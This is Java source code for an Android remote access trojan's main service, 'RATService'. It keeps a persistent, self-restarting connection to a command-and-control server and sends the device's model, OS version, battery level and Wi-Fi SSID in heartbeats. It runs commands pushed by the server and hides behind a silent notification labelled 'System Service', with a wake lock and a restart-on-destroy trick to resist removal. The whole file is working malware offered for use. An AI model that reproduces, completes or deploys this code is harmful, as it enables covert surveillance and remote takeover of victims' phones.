package com.egnakerat.system;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

/**
 * RATService v2.0
 * Main foreground service that maintains persistent connection to C2 server.
 * Handles reconnection, heartbeats, and command routing.
 */
public class RATService extends Service {

    private static final String TAG = "RATService";
    private static final String CHANNEL_ID = "rat_channel";
    private static final int NOTIFICATION_ID = 9874;

    private ConnectionManager connection;
    private CommandRouter router;
    private PowerManager.WakeLock wakeLock;
    private volatile boolean running = false;

    // Static reference for payload services to access the connection
    public static ConnectionManager activeConnection;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");

        createNotificationChannel();

        // Acquire partial wake lock to keep service alive
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                "EgnakeRAT::RATServiceLock");
        wakeLock.acquire();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start as foreground service
        Notification notification = buildNotification();
        startForeground(NOTIFICATION_ID, notification);

        if (!running) {
            running = true;
            new Thread(this::mainLoop).start();
        }

        return START_STICKY;
    }

    /**
     * Main connection loop with auto-reconnect.
     */
    private void mainLoop() {
        long reconnectDelay = config.RECONNECT_DELAY;

        while (running) {
            try {
                // Initialize connection
                connection = new ConnectionManager();
                router = new CommandRouter(getApplicationContext(), connection);
                activeConnection = connection;

                Log.d(TAG, "Connecting to " + config.IP + ":" + config.port);

                if (!connection.connect(config.IP, Integer.parseInt(config.port))) {
                    Log.e(TAG, "Connection failed, retrying in " + reconnectDelay + "ms");
                    Thread.sleep(reconnectDelay);
                    reconnectDelay = Math.min(reconnectDelay * 2, config.MAX_RECONNECT_DELAY);
                    continue;
                }

                // Perform handshake
                if (!connection.handshake(
                        Build.MODEL,
                        Build.VERSION.RELEASE,
                        Build.MANUFACTURER)) {
                    Log.e(TAG, "Handshake failed, retrying...");
                    Thread.sleep(reconnectDelay);
                    continue;
                }

                // Reset reconnect delay on successful connection
                reconnectDelay = config.RECONNECT_DELAY;

                // Start heartbeat thread
                Thread heartbeatThread = new Thread(this::heartbeatLoop);
                heartbeatThread.setDaemon(true);
                heartbeatThread.start();

                // Command receive loop
                while (running && connection.isConnected()) {
                    JSONObject message = connection.receiveMessage();
                    if (message == null) {
                        Log.w(TAG, "Null message received, connection lost");
                        break;
                    }

                    String type = message.optString("type", "");
                    if ("command".equals(type)) {
                        // Route to handler in background thread
                        final JSONObject msg = message;
                        new Thread(() -> router.route(msg)).start();
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "Main loop error: " + e.getMessage());
            }

            // Cleanup before reconnect
            if (connection != null) {
                connection.disconnect();
            }
            activeConnection = null;

            if (running) {
                try {
                    Log.d(TAG, "Reconnecting in " + reconnectDelay + "ms");
                    Thread.sleep(reconnectDelay);
                    reconnectDelay = Math.min(reconnectDelay * 2, config.MAX_RECONNECT_DELAY);
                } catch (InterruptedException ignored) {}
            }
        }
    }

    /**
     * Send periodic heartbeats with device status.
     */
    private void heartbeatLoop() {
        while (running && connection != null && connection.isConnected()) {
            try {
                JSONObject info = new JSONObject();
                info.put("model", Build.MODEL);
                info.put("android_version", Build.VERSION.RELEASE);
                info.put("battery", getBatteryLevel());
                info.put("wifi", getWifiSSID());

                connection.sendHeartbeat(info);

                Thread.sleep(config.HEARTBEAT_INTERVAL);
            } catch (Exception e) {
                Log.e(TAG, "Heartbeat error: " + e.getMessage());
                break;
            }
        }
    }

    private int getBatteryLevel() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                return (int) ((level / (float) scale) * 100);
            }
        } catch (Exception ignored) {}
        return -1;
    }

    private String getWifiSSID() {
        try {
            WifiManager wifiManager = (WifiManager) getApplicationContext()
                    .getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null) {
                WifiInfo info = wifiManager.getConnectionInfo();
                return info.getSSID().replace("\"", "");
            }
        } catch (Exception ignored) {}
        return "Unknown";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setSilent(true)
                .build();
    }

    @Override
    public void onDestroy() {
        running = false;
        if (connection != null) {
            connection.disconnect();
        }
        activeConnection = null;
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        // Restart via broadcast receiver
        Intent broadcastIntent = new Intent(this, broadcastReciever.class);
        sendBroadcast(broadcastIntent);
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
